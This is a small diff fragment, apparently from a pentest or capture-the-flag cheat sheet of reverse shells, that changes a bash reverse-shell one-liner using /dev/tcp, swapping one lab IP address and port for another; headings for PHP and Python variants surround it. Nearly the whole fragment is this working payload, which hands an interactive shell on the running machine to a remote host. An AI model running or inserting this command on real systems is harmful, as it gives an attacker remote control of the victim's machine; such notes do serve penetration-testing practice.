@@ -10,7 +10,7 @@ php -S 0.0.0.0:<port>
 
 Bash
 ```bash
-/bin/bash -c 'bash+-i >& /dev/tcp/10.10.16.16/9006 0>&1'
+/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.44/443 0>&1'
 ```
 
 Python But Bash
